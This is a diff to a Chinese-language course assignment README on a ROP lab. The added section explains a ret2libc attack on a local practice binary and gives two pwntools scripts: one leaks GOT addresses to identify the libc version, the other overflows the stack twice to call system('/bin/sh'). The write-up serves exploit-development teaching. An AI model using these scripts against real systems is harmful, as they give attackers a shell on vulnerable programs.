@@ -1,4 +1,5 @@
 # SimpleROP
+
 国科大网络攻防基础第二次作业（2023）
 
 ## 00 概述
@@ -474,7 +475,7 @@ pwn_obj.interactive()
 
 ![image-20230418191605679](./README.assets/image-20230418191605679.png)
 
-让main()函数返回到PLT表中的system@plt函数位置即可，会自己跳转到真正的system函数代码段。需要注意的是，system()函数是通过`CALL`调用的，和上一个实验中直接`RET`到代码段不同：
+让main()函数返回到PLT表中的system@plt函数位置即可，因为GOT表中只有一个地址，没有汇编指令，PLT表对应位置的指令就是“跳转到GOT表中保存的地址”，因此在这里main()函数的返回地址应该是PLT表的表项。需要注意的是，system()函数是通过`CALL`调用的，和上一个实验中直接`RET`到代码段不同：
 
 ![stack-3](./README.assets/stack-3.jpg)
 
@@ -580,3 +581,96 @@ pwn_obj.interactive()
 
 ## 06 ret2libc-3
 
+例行检查：
+
+![image-20230419153906167](./README.assets/image-20230419153906167.png)
+
+![image-20230419153751632](./README.assets/image-20230419153751632.png)
+
+![image-20230419153821401](./README.assets/image-20230419153821401.png)
+
+在上一个实验的基础上，这次PLT表没有可以利用的system()函数了。解决方案是从GOT表入手：虽然动态链接库libc.so在内存中的地址不确定，但是PLT表/GOT表中记录了libc.so库中其他函数的信息，例如puts()函数或者\_\_libc\_start\_main()函数，而库内函数之间的相对位置是不变的。同样的，“/bin/sh”字符串也可以在libc.so中找到。
+
+附：ASLR随机化不会影响地址的后12个比特，因为内存中需要对齐。因此获取到库函数在某次程序执行时的真实地址之后，获取其后12比特，就可以在网站https://libc.blukat.me上根据libc库版本、函数名以及后12比特特征来定位其相对位置了。
+
+由于GOT表的懒加载，在某个函数调用之前GOT表中是没有这个函数的实际地址的（这个时候GOT表中放着的实际上是PLT表项的地址），相对的，懒加载的GOT表是可以读写的，现在的目标就是在某个libc库函数执行之后得到其在GOT表中的地址，通过先验的libc库内函数相对位置关系，得到system()函数和字符串“/bin/sh”的实际内存地址。
+
+那么如何在程序运行时得到GOT表的信息呢（IDA是静态分析，其GOT表是初始状态），这里需要用到已经存在于程序PLT表中的puts()函数，例如现在程序已经执行过\_\_libc\_start\_main()函数，其GOT表项已经加载其真实内存地址，将这个地址作为puts()函数的参数输出到程序外部，计算出此时system()函数汇编指令和字符串“/bin/sh”的内存地址，再让程序重新返回main()函数，进行第二次栈溢出：
+
+![stack-6](./README.assets/stack-6-1681897017950-2.jpg)
+
+上图中没有用\_\_libc\_start\_main@got，而是puts@got，没啥特变的原因，就是因为前者太长了，反正puts()函数在这个时候也已经在GOT表中登记在册了，都可以用。实现的脚本如下：
+
+```python
+from pwn import *
+
+
+# ret2libc3 - stage 01
+elf = ELF("./ret2libc3")
+import random
+addr_puts_plt = elf.plt["puts"]
+for x in random.sample(elf.got.keys(), 8):
+    addr_x = elf.got[x]
+
+    pwn_obj = process("./ret2libc3")
+    pwn_obj.sendlineafter(
+        b"!?", 
+        b"#" * 112 + 
+        p32(addr_puts_plt) + 
+        b"#" * 4 + 
+        p32(addr_x))
+    print(f"[#] {x} addr: {hex(u32(pwn_obj.recv(4)))}")
+```
+
+上面是确定libc版本的脚本，这里进行了独立的多次溢出，分别输出了随机选择的几个函数的实际地址（目的是想缩小一下查找范围），结果是：
+
+![image-20230419171320045](./README.assets/image-20230419171320045.png)
+
+![image-20230419171415503](./README.assets/image-20230419171415503.png)
+
+我还尝试了其他库函数，但是也没能区别出来到底是这两个库中的哪一个（我看他版本也挨得很近，可能就是换了个名字），这里取第一个库作为实验对象，其函数偏移量如下：
+
+![image-20230419171908397](./README.assets/image-20230419171908397.png)
+
+可以得到system()函数和字符串“/bin/sh”的偏移量分别为0x048150和0x1bd0f5，puts()函数则是0x073260。这代表system()函数在puts()函数的176400字节之前，字符串“/bin/sh”在puts()函数的1351317字节之后。
+
+下面按照之前的架构图实现重新返回main()函数进行二次溢出的脚本：
+
+```python
+from pwn import *
+
+
+# ret2libc3 - stage 02
+elf = ELF("./ret2libc3")
+addr_puts_plt = elf.plt["puts"]
+addr_puts_got = elf.got["puts"]
+addr_main_plt = elf.symbols["_start"] # main()函数的真正起始点是_start()函数
+puts_to_system = -176400
+puts_to_binsh = 1351317
+
+pwn_obj = process("./ret2libc3")
+pwn_obj.sendlineafter(
+    b"!?", 
+    b"#" * 112 + 
+    p32(addr_puts_plt) + 
+    p32(addr_main_plt) + 
+    p32(addr_puts_got))
+
+addr_puts_memory = u32(pwn_obj.recv(4))
+addr_system_memory = addr_puts_memory + puts_to_system
+addr_binsh_memory = addr_puts_memory + puts_to_binsh
+pwn_obj.sendlineafter(
+    b"!?", 
+    b"#" * 112 + 
+    p32(addr_system_memory) + 
+    b"#" * 4 + 
+    p32(addr_binsh_memory))
+
+pwn_obj.interactive()
+```
+
+看看效果：
+
+![image-20230419173536548](./README.assets/image-20230419173536548.png)
+
+好耶！
